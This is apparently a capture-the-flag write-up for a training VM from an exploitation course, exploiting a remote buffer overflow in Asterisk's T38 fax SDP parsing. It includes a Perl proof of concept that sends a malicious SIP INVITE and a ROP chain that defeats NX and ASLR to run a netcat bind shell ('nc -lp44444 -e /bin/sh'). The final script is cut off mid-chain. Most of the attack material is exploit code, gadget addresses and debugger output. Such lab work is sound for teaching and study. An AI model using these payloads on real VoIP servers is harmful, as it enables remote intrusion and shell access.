# sipcrash

In the Exploitlab at Blackhat Las Vegas 2016, the attendands were given a VM with the name
tinysploit2, which we can use to improve our exploiting skills. There are
three flags. The first one we solved in the course. This is the solution to the
second flag, a memory corruption vulnerability in asterisk.

The FLAG1.TXT contained a fully working PoC, which already yield in EIP=0x41414141 in asterisk,
so i thought this would be a quick one to solve. At the end I needed like 10-20
hours. As I was in holidays in Italy, I barely had Internet access, which was
another complication. Greetz to my GF who was patient with me all this time ;-)

This writeup is based on my notes, and may be not as clearly written as possible.

## TL;DR

Buffer overflow on asterisk on tinysploit2, 32bit VM, no PIE. Used `execl` by
writing `nc` command line to a page filled with nulls.


## Preconditions

PoC which was given from /home/xhttpd/FLAG1.TXT:

```
#!/usr/bin/perl
# Remote Buffer Overflow in Asterisk T38 fax
# The Exploit Laboratory - TINYSPLOIT2

use IO::Socket;

if(not $ARGV[0]) {
   print "Usage: sipcrash.pl <host>\n";
   exit;
}

my $target=$ARGV[0];
my $target_port = 5060;

my $eip = 0x42424242;
my $padding = "A" x 556;

my $buf = $padding . pack("V", $eip);

my $sip_packet = "v=0\n";
$sip_packet .= "o=rtp 1160124458839569000 160124458839569000 IN IP4 127.0.0.1\n";
$sip_packet .= "s=-\n";
$sip_packet .= "c=IN IP4 127.0.0.1\n";
$sip_packet .= "t=0 0\n";
$sip_packet .= "m=image 5004 UDPTL t38\n";
$sip_packet .= "a=T38FaxVersion:0\n";
$sip_packet .= "a=T38MaxBitRate:14400\n";
$sip_packet .= "a=T38FaxMaxBuffer:1024\n";
$sip_packet .= "a=T38FaxMaxDatagram:238\n";
$sip_packet .= "a=T38FaxRateManagement:$buf\n";
$sip_packet .= "a=T38FaxUdpEC:t38UDPRedundancy\n";

$sip_length = length($sip_packet);

my $packet =<<END;
INVITE sip:200\@127.0.0.1 SIP/2.0
CSeq: 1 INVITE
Via: SIP/2.0/UDP 127.0.0.1:1024
From: "Prank Caller" <sip:prank\@127.0.0.1:1024>
Call-ID: aaaaaaaa-aaaa-aaaaaaa-aaaa-aaaaaaaaaaaa\@localhost
To: <sip:200@localhost>
Allow: INVITE,ACK,OPTIONS,BYE,CANCEL,NOTIFY,REFER,MESSAGE
Content-Type: application/sdp
Content-Length: $sip_length
Max-Forwards: 70

$sip_packet
END

print "Packet\n$packet\n";

print "Sending Packet to: " . $target . "\n\n";
socket(SOCK, PF_INET, SOCK_DGRAM, getprotobyname("udp"));
my $ipaddr = inet_aton($target);
my $sendto = sockaddr_in($target_port, $ipaddr);
send(SOCK, $packet, 0, $sendto) == length($packet) or die "cannot send to $target : $target_port : $!\n";
print "Sent.\n";
```

Lets run the PoC and see what happens in the debugger. We have to attach to the
second asterisk process `/usr/bin/asterisk`, not the shell script `start_asterisk`.
After a crash, asterisk will automatically restart in a few seconds.

```
user@tinysploit2:~$ ps axw | grep -i ast
 1187 root       0:00 {start_asterisk} /bin/sh /usr/bin/start_asterisk
 1189 asterisk   0:00 /usr/bin/asterisk -U asterisk -v
 1271 user       0:00 grep -i ast
user@tinysploit2:~$ gdb
(gdb) attach 1189
Attaching to process 1189
(gdb) c
Continuing.
[New LWP 1206]

Program received signal SIGSEGV, Segmentation fault.
[Switching to LWP 1206]
0x42424242 in ?? ()
(gdb)
(gdb) i r
eax            0x0	0x0
ecx            0x8000e	0x8000e
edx            0x815e320	0x815e320
ebx            0x41414141	0x41414141
esp            0xb7353bc0	0xb7353bc0
ebp            0x41414141	0x41414141
esi            0x41414141	0x41414141
edi            0x41414141	0x41414141
eip            0x42424242	0x42424242
eflags         0x10246	[ PF ZF IF RF ]
cs             0x73	0x73
ss             0x7b	0x7b
ds             0x7b	0x7b
es             0x7b	0x7b
fs             0x0	0x0
gs             0x33	0x33
```

Here a useful command to start gdb with the asterisk PID, which I used a lot:
```
user@tinysploit2:~$ gdb -p `ps axw | grep "/usr/bin/asterisk" | grep -v grep | awk '{ print $1}'`
```


`EIP=0x42424242` at the time of the crash is based on this part of the code:
```
my $eip = 0x42424242;
my $padding = "A" x 556;
my $buf = $padding . pack("V", $eip);
```

Also ESP seems to point to the end of the input buffer:
```
(gdb) x/4x $esp
0xb7339bc0:	0x00000000	0xb733d163	0x00000001	0xb733cf30
(gdb) x/8x $esp-8
0xb71fabb8:	0x41414141	0x42424242	0x00000000	0xb71fe163
```


Lets check where `EDX=0x815e320` points to, just so we have an overview:

```
(gdb) x/32x $edx
0x815e320 <option_debug>:	0x00000000	0x00000000	0x00000000	0x00000000
0x815e330:	0x00000000	0x00000000	0x00000000	0x00000000
0x815e340 <ast_config_AST_DATA_DIR>:	0x7261762f	0x62696c2f	0x7473612f	0x73697265
0x815e350 <ast_config_AST_DATA_DIR+16>:	0x0000006b	0x00000000	0x00000000	0x00000000
0x815e360 <ast_config_AST_DATA_DIR+32>:	0x00000000	0x00000000	0x00000000	0x00000000
0x815e370 <ast_config_AST_DATA_DIR+48>:	0x00000000	0x00000000	0x00000000	0x00000000
0x815e380 <ast_config_AST_DATA_DIR+64>:	0x00000000	0x00000000	0x00000000	0x00000000
0x815e390 <ast_config_AST_DATA_DIR+80>:	0x00000000	0x00000000	0x00000000	0x00000000


(gdb) info proc mappings
process 1186
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8145000    0xfd000        0x0 /usr/bin/asterisk
	 0x8145000  0x8154000     0xf000    0xfc000 /usr/bin/asterisk
	 0x8154000  0x8171000    0x1d000        0x0
...
```

No help, lets check with `readelf`:

```
user@tinysploit2:~$ readelf -l /usr/bin/asterisk

Elf file type is EXEC (Executable file)
Entry point 0x8057790
There are 7 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x000e0 0x000e0 R E 0x4
  INTERP         0x000114 0x08048114 0x08048114 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0xfc03b 0xfc03b R E 0x1000
->LOAD           0x0fc040 0x08145040 0x08145040 0x0e45c 0x2b000 RW  0x1000
  DYNAMIC        0x109e5c 0x08152e5c 0x08152e5c 0x00100 0x00100 RW  0x4
  NOTE           0x000128 0x08048128 0x08048128 0x00020 0x00020 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4

 Section to Segment mapping:
  Segment Sections...
   00
   01     .interp
   02     .interp .note.ABI-tag .hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata
-> 03     .data .eh_frame .dynamic .ctors .dtors .jcr .got .bss
   04     .dynamic
   05     .note.ABI-tag
   06
user@tinysploit2:~$
```

Seems `EDX` points to a RW mapped page within the .data segments etc. Could be useful for later.


As last step of the preparation, lets check the hardening of the binary by using checksec (https://github.com/slimm609/checksec.sh)
```
dobin@minime:~/Desktop/sip$ scp user@192.168.2.136:/usr/bin/asterisk .
user@192.168.2.136's password:
asterisk                                      100% 9137KB   8.9MB/s   00:00
dobin@minime:~/Desktop/sip$ bash checksec.sh -f asterisk
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		46	asterisk
```

And ASLR status:
```
user@tinysploit2:~$ cat /proc/sys/kernel/randomize_va_space
2
```

So, protection is:
- No stack canary
- no PIE
- ASLR is enabled
- NX is enabled

Means we only have to defeat NX and ASLR.




## restricted chars

after testing, i realized that some chars are invalid. They make the asterisk
to stop copying the payload. This includes of course the null bytes \x00, but at least
also the following bytes:
```
$payload .= pack("V", 0x09090909); # tab
$payload .= pack("V", 0x0A0A0A0A); # nl
$payload .= pack("V", 0x0B0B0B0B); # tab
$payload .= pack("V", 0x0C0C0C0C); #
$payload .= pack("V", 0x0D0D0D0D); #
$payload .= pack("V", 0x20202020); # space
```

I did only test the most obvious ones, so maybe this list is incomplete.


We can define it in ropper:
```
(asterisk/ELF/x86)> badbytes 090a0b2000
```

And search for a new `pop eax` (as the first one I found containted \x09),
some examples:

```
0x08061bf5: pop eax; add al, 0x89; ret;
0x08060f10: pop eax; pop ebx; pop ebp; ret;
```

The first one involves calculation, which is a bit cumbersome.
So i'm taking the 2nd one.


## Buffer extension check

Lets check if we can add data at the end of the buffer, because this would
make a stack flip very easy:


Payload:
```
my $buf = $padding . pack("V", $eip) . "CCCCDDDDEEEEFFFFGGGG";
```

```
(gdb) c
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/32x $esp
0xb7344bc0:	0x43434343	0x44444444	0x45454545	0x46464646
0xb7344bd0:	0x47474747	0x00000000	0x00000000	0x00000000
```

Yes we can, the "CCCCDDDD..." appeared on the stack. Awesome!



## Stack flip

Upon crash, ESP already points to our payload. So we can just do
a `ret` as first instruction to switch to our ROP stack:

Lets do an initial test:
```
$payload = pack("V", 0x01010101);
$payload .= pack("V", 0x02020202);
$payload .= pack("V", 0x03030303);

my $buf = $padding . $payload;
```

On crash:
```
(gdb) c
Continuing.
[New LWP 4001]

Program received signal SIGSEGV, Segmentation fault.
[Switching to LWP 4001]
0x01010101 in ?? ()
(gdb) x/8x $esp
0xb7343bc0:	0x02020202	0x03030303	0x00000000	0xb7346f30
0xb7343bd0:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/8x $esp - 4
0xb7343bbc:	0x01010101	0x02020202	0x03030303	0x00000000
0xb7343bcc:	0xb7346f30	0x00000000	0x00000000	0x00000000
(gdb) x/1i 0x08048af0
   0x8048af0:	ret
```

It tries to execute the code at address `0x01010101`. If we replace this with the address
of a ret, it will execute the ret, and then automatically continue to the
next address on the stack: `0x02020202`. Or at least, this is the assumption.

So, therefore we can just do a ret, like this one:
```
(gdb) x/1i 0x08048af0
   0x8048af0:	ret
```

Test it, by replacing the `0x01010101` with `0x08048af0`:
```
$payload = pack("V", 0x08048af0); // ret
$payload .= pack("V", 0x02020202);
$payload .= pack("V", 0x03030303);
```

in GDB:
```
0x02020202 in ?? ()
(gdb) x/8x $esp
0xb71fabc4:	0x03030303	0x00000000	0xb71fdf30	0x00000000
0xb71fabd4:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/8x $esp-4
0xb71fabc0:	0x02020202	0x03030303	0x00000000	0xb71fdf30
0xb71fabd0:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/8x $esp-8
0xb71fabbc:	0x08048af0	0x02020202	0x03030303	0x00000000
0xb71fabcc:	0xb71fdf30	0x00000000	0x00000000	0x00000000
```

As expected, it crashes on `0x02020202`. Assumption was correct.



## ROP Code planning

The (initial) plan is to implement one of the following ROP codes:

plan a:
1) copy "nc -l -p 4444 -e /bin/sh" into writeable EDX page
2) execute system() with that EDX memory addr

plan b:
1) mprotect() [esp] for +x
2) execute shellcode after end of ROP


### Trouble with plan a

As we have seen, 0x20 = SPACE is not a valid char. Therefore we cannot just copy
the shell command line to somewhere, as the write4() call will contain that invalid char.

Note that I only realized this later, after having written an exploit which did not work :-)
The details are written below in the chapter "Fails".

### Trouble with plan b

I assumed that this will not work, because the shellcode is like 500 bytes, so we run
intro trouble because sooner or later we want to write into a memory address
which contains bad chars. Upon writing this writeup, i realized this was not
the case (the ROP code to write the shellcode is 500 bytes, not the shellcode itself).
Only the gadgets contained badchars. Anyway, i abondend this plan.
But the details are written below in the chapter "Fails".

### Working plan

One way around the bad chars restriction would be to write the plan A without spaces,
and then manually write the spaces with some trickery (e.g. decrementing 0x21 to 0x20). But
that was too cumbersome for me, and a very specific solution.

I was thinking a bit about executing bash code without spaces, which naturally led me to execl().
execl() will take an the arguments as parameters, so there is no need for spaces.
There are actually several interesting restrictions, but i'll talk about this in a later chapter.


## write4() gadgets

Lets first create the write4() perl function, which we need to create ROP code to
write arbitrary 4-bytes at a predefined location within the process memory space.

Search for gadgets for the write4() function:
- ret
- pop eax; ret
- pop edx; ret
- mov dword ptr [edx], eax; ret;


I just blindly searched for a "mov [edx], eax", and already got a nice gadget,
and all of his companions.

```
dobin@minime:~/Desktop/sip$ ropper
(ropper)> type rop
(ropper)> file asterisk
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.

(asterisk/ELF/x86)> search mov [edx], eax
[INFO] Searching for gadgets: mov [edx], eax
[INFO] File: asterisk
0x08112483: mov dword ptr [edx], eax; pop ebx; pop ebp; ret;

(asterisk/ELF/x86)> search /1/ pop eax
[INFO] Searching for gadgets: pop eax
[INFO] File: asterisk
0x08096171: pop eax; ret;

(asterisk/ELF/x86)> search /1/ pop edx
[INFO] Searching for gadgets: pop edx
[INFO] File: asterisk
0x0808db7e: pop edx; ret;

(asterisk/ELF/x86)> search /1/ ret
[INFO] Searching for gadgets: ret
[INFO] File: asterisk
....
0x08048af0: ret;
```


Prepare the write4 function:
```
$pop_eax = 0x08060f10; # 0x08060f10: pop eax; pop ebx; pop ebp; ret;
$pop_ebx = 0x0813c85c; # 0x0813c85c: pop ebx; ret;
$pop_edx = 0x0808db7e; # 0x0808db7e: pop edx; ret;


# load immediate eax with value
sub load_eax {
	my ($eax) = @_;
	my $gadget = "";

	$gadget .= pack("V", $pop_eax);   # pop eax; ret
	$gadget .= pack("V", $eax);       # --> EAX
	$gadget .= pack("V", 0x44444444); # fake EBX
	$gadget .= pack("V", 0x44444444); # fake EBP
	return($gadget);
}


# writes value of eax to a specific memory address
sub write_mem_eax {
	my ($addr) = @_;
	my $gadget .= "";

	$gadget .= pack("V", $pop_edx);      # pop R1; ret
	$gadget .= pack("V", $addr);         # R1 = address
	$gadget .= pack("V", $mov_dedx_eax); # mov dword ptr [R1], eax; ret
	$gadget .= pack("V", 0x45454545);
	$gadget .= pack("V", 0x45454545);
	return($gadget);
}


# write4 - write any 4-byte value to any memory address
sub write4 {
	my ($addr, $data) = @_;
	my $gadget .= "";

	$gadget .= load_eax($data);
	$gadget .= write_mem_eax($addr);

	return($gadget);
}
```



## execl

execl is defined as follows:

man 3 execl:
```
int execl(const char *path, const char *arg, ..., /* (char  *) NULL */);

The initial argument for these functions is the name of a file that is  to  be  exe‐
cuted.

The  const  char *arg and subsequent ellipses in the execl(), execlp(), and execle()
functions can be thought of as arg0, arg1, ..., argn.  Together they describe a list
of  one or more pointers to null-terminated strings that represent the argument list
available to the executed program.  The first argument, by convention, should  point
to the filename associated with the file being executed.  The list of arguments must
be terminated by a null pointer, and,  since  these  are  variadic  functions,  this
pointer must be cast (char *) NULL.
```

Note the restrictions:
1) each argument needs to be null terminated
2) last argument needs to be null

This sounds a bit hard to implement, as we cannot write any null bytes (or, not easily).
How can we fulfill number 1? Actually, I already found a nice memory space full of null bytes! EDX was pointing to it:
```
(gdb) x/64x $edx
0x815e320 <option_debug>:	0x00000000	0x00000000	0x00000000	0x00000000
0x815e330:	0x00000000	0x00000000	0x00000000	0x00000000
0x815e340 <ast_config_AST_DATA_DIR>:	0x7261762f	0x62696c2f	0x7473612f	0x73697265
0x815e350 <ast_config_AST_DATA_DIR+16>:	0x0000006b	0x00000000	0x00000000	0x00000000
0x815e360 <ast_config_AST_DATA_DIR+32>:	0x00000000	0x00000000	0x00000000	0x00000000
0x815e370 <ast_config_AST_DATA_DIR+48>:	0x00000000	0x00000000	0x00000000	0x00000000
0x815e380 <ast_config_AST_DATA_DIR+64>:	0x00000000	0x00000000	0x00000000	0x00000000
0x815e390 <ast_config_AST_DATA_DIR+80>:	0x00000000	0x00000000	0x00000000	0x00000000
0x815e3a0 <ast_config_AST_DATA_DIR+96>:	0x00000000	0x00000000	0x00000000	0x00000000
0x815e3b0 <ast_config_AST_DATA_DIR+112>:	0x00000000	0x00000000	0x00000000	0x00000000
0x815e3c0 <ast_config_AST_DATA_DIR+128>:	0x00000000	0x00000000	0x00000000	0x00000000
0x815e3d0 <ast_config_AST_DATA_DIR+144>:	0x00000000	0x00000000	0x00000000	0x00000000
```

So i'll use this memory address space, write the arguments for `execl` into it, and re-use the
existing null bytes.


And how can we fulfill number 2? Actually, we are pretty lucky, as after our payload
are only null bytes (after a certain length).
```
(gdb) x/32x $esp-8
0xb725abb8:	0x41414141	0x11223344	0x00000000	0xb725e163
0xb725abc8:	0x00000001	0xb725df30	0x00000000	0x00000000
0xb725abd8:	0x00000000	0x00000000	0x00000000	0x00000000
0xb725abe8:	0x00000000	0x00000000	0x00000000	0x00000000
0xb725abf8:	0x00000000	0x00000000	0x00000000	0x00000000
0xb725ac08:	0x00000000	0x0000000a	0x00000000	0x0000000a
0xb725ac18:	0x00000000	0x00000000	0x00000000	0x00000000
0xb725ac28:	0x00000000	0x00000000	0x00000000	0x00000000
```


But, there is an additional restriction:
3) the argument length needs to be a multiple of 4
Because we can only write 4-bytes at a time, and the strings need to be null terminated.
It may be possible to write only 1 or 2 bytes at a time, but this is a bit cumbersome.

So, is it possible to convert this string into arguments which are a multiple of 4 bytes?
```
/bin/nc -l -p 4444 -e /bin/sh
```

After some trying, the answer is yes! Surprisingly:
```
//bin/nc -lp44444 -e////bin/sh
```


Lets first check it how it works in C. Note that tinysploit2 is based on busybox,
therefore the first argument has to be "/bin/busybox", or we have an error like `lp44444: applet not found`.
```
#include <stdio.h>
#include <unistd.h>

void main(void) {
	char *path = "/bin/busybox"; # 12
	char *a1 = "//usr/bin/nc";   # 12
	char *a2 = "-lp44444";       # 8
	char *a3 = "-e////bin/sh";   # 12

	execl(path, a1, a2, a3, NULL);
}

(gdb) disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   ebp
   0x080483f5 <+1>:	mov    ebp,esp
   0x080483f7 <+3>:	and    esp,0xfffffff0
   0x080483fa <+6>:	sub    esp,0x30
   0x080483fd <+9>:	mov    DWORD PTR [esp+0x2c],0x8048504
   0x08048405 <+17>:	mov    DWORD PTR [esp+0x28],0x8048511
   0x0804840d <+25>:	mov    DWORD PTR [esp+0x24],0x804851e
   0x08048415 <+33>:	mov    DWORD PTR [esp+0x20],0x8048527
   0x0804841d <+41>:	mov    DWORD PTR [esp+0x10],0x0
   0x08048425 <+49>:	mov    eax,DWORD PTR [esp+0x20]
   0x08048429 <+53>:	mov    DWORD PTR [esp+0xc],eax
   0x0804842d <+57>:	mov    eax,DWORD PTR [esp+0x24]
   0x08048431 <+61>:	mov    DWORD PTR [esp+0x8],eax
   0x08048435 <+65>:	mov    eax,DWORD PTR [esp+0x28]
   0x08048439 <+69>:	mov    DWORD PTR [esp+0x4],eax
   0x0804843d <+73>:	mov    eax,DWORD PTR [esp+0x2c]
   0x08048441 <+77>:	mov    DWORD PTR [esp],eax
   0x08048444 <+80>:	call   0x80482e0 <execl@plt>
   0x08048449 <+85>:	leave
   0x0804844a <+86>:	ret
End of assembler dump.
```

And yes, it worked. Lets write these strings to our page full of null bytes,
using the write4() function.


i use `echo -n "bytes to write" | hexdump -C` to gain access to the bytes
of a string.

```
$exec_path_addr = 0x815e354;
$exec_arg1_addr = 0x815e364;
$exec_arg2_addr = 0x815e374;
$exec_arg3_addr = 0x815e384;


# 12: "/bin/busybox
# 2f 62 69 6e 2f 62 75 73  79 62 6f 78 0a           |/bin/busybox.|
$ropchain .= write4($exec_path_addr+0, 0x6e69622f); # 2f 62 69 6e
$ropchain .= write4($exec_path_addr+4, 0x7375622f); # 2f 62 75 73
$ropchain .= write4($exec_path_addr+8, 0x786f6279); # 79 62 6f 78

# 12: "//usr/bin/nc"
# 2f 2f 75 73 | 72 2f 62 69 | 6e 2f 6e 63              |//usr/bin/nc|
$ropchain .= write4($exec_arg1_addr+0, 0x73752f2f); # 2f 2f 75 73
$ropchain .= write4($exec_arg1_addr+4, 0x69622f72); # 72 2f 62 69
$ropchain .= write4($exec_arg1_addr+8, 0x636e2f6e); # 6e 2f 6e 63

#  8: "-lp44444"
# 2d 6c 70 34 34 34 34 34                           |-lp44444|
$ropchain .= write4($exec_arg2_addr+0, 0x34706c2d); # 2d 6c 70 34
$ropchain .= write4($exec_arg2_addr+4, 0x34343434); # 34 34 34 34

# 12: "-e////bin/sh"
# 2d 65 2f 2f 2f 2f 62 69  6e 2f 73 68              |-e////bin/sh|
$ropchain .= write4($exec_arg3_addr+0, 0x2f2f652d); # 2d 65 2f 2f
$ropchain .= write4($exec_arg3_addr+4, 0x69622f2f); # 2f 2f 62 69
$ropchain .= write4($exec_arg3_addr+8, 0x68732f6e); # 6e 2f 73 68


$ropchain .= pack("V", $ADDRESS_OF_EXECL); # just a placeholder for execl()

$ropchain .= pack("V", $exec_path_addr);	 # path
$ropchain .= pack("V", $exec_arg1_addr);	 # arg1
$ropchain .= pack("V", $exec_arg2_addr);	 # arg2
$ropchain .= pack("V", $exec_arg3_addr);	 # arg3
                                           # null implicit, already on stack

```

But actually, we have to dynamically find the address of execl(), for example
by using the already called function mmap(). We cannot define it statically
with $ADDRESS_OF_EXECL as written above, this is just for illustration.



## Find addresss of execl

### malloc

Check address of malloc:
```
dobin@minime:~/Desktop/sip$ objdump -R asterisk | grep malloc
0815324c R_386_JUMP_SLOT   malloc@GLIBC_2.0
```

Note: the following commands need to be executed after malloc() get resolved by asterisk. So it is not enough just to do "gdb asterisk", but you have to attach to a running asterisk process.

Address of malloc inside the plt:
```
(gdb) x/1x 0x0815324c
0x815324c <malloc@got.plt>:	0xb7438160
```

Address of malloc in libc mapped in process:
```
(gdb) x/1x 0xb7438160
0xb7438160 <malloc>:	0x0ce85356
```

### execl

Check the addresses of execl and malloc in libc:
```
user@tinysploit2:~$ objdump -T /lib/libc-2.17.so | egrep "malloc|execl"
...
000b9090 g    DF .text	0000016a  GLIBC_2.0   execl
00079160 g    DF .text	00000136  GLIBC_2.0   malloc
...
```

Calculate offset between malloc and execl:
```
dobin@minime:~$ printf "%x\n" $((0x000b9090-0x00079160))
3ff30
```

Test the offset while debugging asterisk:
```
(gdb) x/1x 0x0815324c
0x815324c <malloc@got.plt>:	0xb74cd160
(gdb) x/4x 0xb74cd160+3ff30
0xb750d090 <execl>:	0x53565755	0x102cec81	0x848b0000	0x00104424
```

Success!

So, to get address of execl in the exploit in the address space of asterisk:
- get address of malloc: `mov reg, [0x0815324c]`
- mov offset to execl to a register: `mov reg2, 0x3ff30`
- `add reg2, reg`, so reg2 has now the execl() offset


I use this gadget for add:
```
0x081187df: add eax, dword ptr [ebx + 0x5e5b5cc4]; pop edi; pop ebp; ret;
```
EBX (address of system) has to be adjusted accordingly.

Another complication: the offset, which we write into eax, contains null bytes: `0x0003ff30`
I fixed this by just searching for some "xor eax, ???????", and xor it in advance in C:

I used this gadget:
```
0x0811ef88: xor eax, 0x2f131326; ret;
```

Lets prepare it:
```
user@tinysploit2:~$ cat xor.c
#include <stdio.h>

void main(void) {
	unsigned int a = 0x3ff30; // my offset
	a = a ^ 0x2f131326; // xor nr found in gadget
	printf("0x%x\n", a);
}
user@tinysploit2:~$ gcc xor.c && ./a.out
0x2f10ec16
```

So we have to load 0x2f10ec16 into eax, xor it with the gadget, and the
result is the offset we need.


In the exploit, it looks like this:
```
	# get addr of execl from PLT
	# we use this add gadget (which we need to work around):
	# 0x081187df: add eax, dword ptr [ebx + 0x5e5b5cc4]; pop edi; pop ebp; ret;

	## get offset into eax
	# offset to eax. The offset is not the original 0x3ff30,
  # but xor'ed with 0x2f131326, therefore 0x2f10ec16
	$ropchain .= pack("V", $pop_eax);    # 0x08060f10: pop eax; pop ebx; pop ebp; ret;
	$ropchain .= pack("V", 0x2f10ec16);  # EAX
	$ropchain .= pack("V", 0x44444444);  # fake EBX
	$ropchain .= pack("V", 0x44444444);  # fake EBP

	# fix eax by xoring it:
	$ropchain .= pack("V", 0x0811ef88);  # 0x0811ef88: xor eax, 0x2f131326; ret;

	## get addr of malloc into ebx
	# addr of malloc into ebx. Adjust for offset contained in add gadget.
	$ropchain .= pack("V", $pop_ebx);    # 0x0813c85c: pop ebx; ret;
	$ropchain .= pack("V", $malloc_addr-0x5e5b5cc4);

	# add eax with [ebx], write result into eax
	# 0x081187df: add eax, dword ptr [ebx + 0x5e5b5cc4]; pop edi; pop ebp; ret;
  # note: we dereference ebx. Therefore its like: eax = eax + *ebx
  #       the dereference will access the address of system, from plt
	$ropchain .= pack("V", 0x081187df);  # add
	$ropchain .= pack("V", 0x44444444);  # fake edi
	$ropchain .= pack("V", 0x44444444);  # fake ebp

	# jmp to addr in eax
	# 0x080577cf: call eax; pop eax; pop ebx; leave; ret;
	# the commands after call (pop eax etc.) will never be executed,
	# as we execl()
	$ropchain .= pack("V", 0x080577cf);  # call eax

	# args for execl
	$ropchain .= pack("V", $exec_path_addr);   # path
	$ropchain .= pack("V", $exec_arg1_addr);   # arg1
	$ropchain .= pack("V", $exec_arg2_addr);   # arg2
	$ropchain .= pack("V", $exec_arg3_addr);   # arg3
	                                           # null implicit
```

# Full exploit

```
#!/usr/bin/perl
# Remote Buffer Overflow in Asterisk T38 fax
# The Exploit Laboratory - TINYSPLOIT2

# 0.3:
# - improved pop eax

use IO::Socket;


$pop_eax = 0x08060f10; # 0x08060f10: pop eax; pop ebx; pop ebp; ret;
$pop_ebx = 0x0813c85c; # 0x0813c85c: pop ebx; ret;
$pop_edx = 0x0808db7e; # 0x0808db7e: pop edx; ret;

$mov_dedx_eax = 0x08112483; # 0x08112483: mov dword ptr [edx], eax; pop ebx; pop ebp; ret;
$ret = 0x08048af0;

$malloc_addr = 0x0815324c;
$malloc_to_system_offset = 0x39fc0;

$writeable_addr = 0x815e324;
$writeable_addr2 = 0x815e324-8;


# load immediate eax with value
sub load_eax {
	my ($eax) = @_;
	my $gadget = "";

	$gadget .= pack("V", $pop_eax);   # pop eax; ret
	$gadget .= pack("V", $eax);       # --> EAX
	$gadget .= pack("V", 0x44444444); # fake EBX
	$gadget .= pack("V", 0x44444444); # fake EBP
	return($gadget);
}


# writes value of eax to a specific memory address
sub write_mem_eax {
	my ($addr) = @_;
	my $gadget .= "";

	$gadget .= pack("V", $pop_edx);      # pop R1; ret
	$gadget .= pack("V", $addr);         # R1 = address
	$gadget .= pack("V", $mov_dedx_eax); # mov dword ptr [R1], eax; ret
	$gadget .= pack("V", 0x45454545);
	$gadget .= pack("V", 0x45454545);
	return($gadget);
}


# write4 - write any 4-byte value to any memory address
sub write4 {
	my ($addr, $data) = @_;
	my $gadget .= "";

	$gadget .= load_eax($data);
	$gadget .= write_mem_eax($addr);

	return($gadget);
}

sub DumpString {
my $s = shift || "";
my @a = unpack('C*',$s);
my $o = 0;
my $i = 0;
print "\tb0 b1 b2 b3 b4 b5 b6 b7\n";
print "\t-- -- -- -- -- -- -- --\n";
while (@a) {
my @b = splice @a,0,8;
my @x = map sprintf("%02x",$_), @b;
my $c = substr($s,$o,8);
$c =~ s/[[:^print:]]/ /g;
printf "w%02d",$i;
print " "x5,join(' ',@x),"\n";
$o += 8;
$i++;
}
}

sub create_payload {
	$ropchain = "";

	# just do a ret
	$ropchain .= pack("V", $ret);

	$exec_path_addr = 0x815e354;
	$exec_arg1_addr = 0x815e364;
	$exec_arg2_addr = 0x815e374;
	$exec_arg3_addr = 0x815e384;


	# 12: "/bin/busybox
	# 2f 62 69 6e 2f 62 75 73  79 62 6f 78 0a           |/bin/busybox.|
	$ropchain .= write4($exec_path_addr+0, 0x6e69622f); # 2f 62 69 6e
	$ropchain .= write4($exec_path_addr+4, 0x7375622f); # 2f 62 75 73
	$ropchain .= write4($exec_path_addr+8, 0x786f6279); # 79 62 6f 78

	# 12: "//usr/bin/nc"
	# 2f 2f 75 73 | 72 2f 62 69 | 6e 2f 6e 63              |//usr/bin/nc|
	$ropchain .= write4($exec_arg1_addr+0, 0x73752f2f); # 2f 2f 75 73
	$ropchain .= write4($exec_arg1_addr+4, 0x69622f72); # 72 2f 62 69
	$ropchain .= write4($exec_arg1_addr+8, 0x636e2f6e); # 6e 2f 6e 63

	#  8: "-lp44444"
	# 2d 6c 70 34 34 34 34 34                           |-lp44444|
	$ropchain .= write4($exec_arg2_addr+0, 0x34706c2d); # 2d 6c 70 34
	$ropchain .= write4($exec_arg2_addr+4, 0x34343434); # 34 34 34 34

	# 12: "-e////bin/sh"
	# 2d 65 2f 2f 2f 2f 62 69  6e 2f 73 68              |-e////bin/sh|
	$ropchain .= write4($exec_arg3_addr+0, 0x2f2f652d); # 2d 65 2f 2f
	$ropchain .= write4($exec_arg3_addr+4, 0x69622f2f); # 2f 2f 62 69
	$ropchain .= write4($exec_arg3_addr+8, 0x68732f6e); # 6e 2f 73 68


		# get addr of execl from PLT
	# we use this add gadget (which we need to work around):
	# 0x081187df: add eax, dword ptr [ebx + 0x5e5b5cc4]; pop edi; pop ebp; ret;

	## get offset into eax
	# offset to eax. The offset is not the original 0x3ff30,
	# but xor'ed with 0x2f131326, therefore 0x2f10ec16
	$ropchain .= pack("V", $pop_eax);    # 0x08060f10: pop eax; pop ebx; pop ebp; ret;
	$ropchain .= pack("V", 0x2f10ec16);  # EAX
	$ropchain .= pack("V", 0x44444444);  # fake EBX
	$ropchain .= pack("V", 0x44444444);  # fake EBP

	# fix eax by xoring it:
	$ropchain .= pack("V", 0x0811ef88);  # 0x0811ef88: xor eax, 0x2f131326; ret;

	## get addr of malloc into ebx
	# addr of malloc into ebx. Adjust for offset contained in add gadget.
	$ropchain .= pack("V", $pop_ebx);    # 0x0813c85c: pop ebx; ret;
	$ropchain .= pack("V", $malloc_addr-0x5e5b5cc4);

	# add eax with [ebx], write result into eax
	# 0x081187df: add eax, dword ptr [ebx + 0x5e5b5cc4]; pop edi; pop ebp; ret;
	# note: we dereference ebx. Therefore its like: eax = eax + *ebx
	#       the dereference will access the address of system, from plt
	$ropchain .= pack("V", 0x081187df);  # add
	$ropchain .= pack("V", 0x44444444);  # fake edi
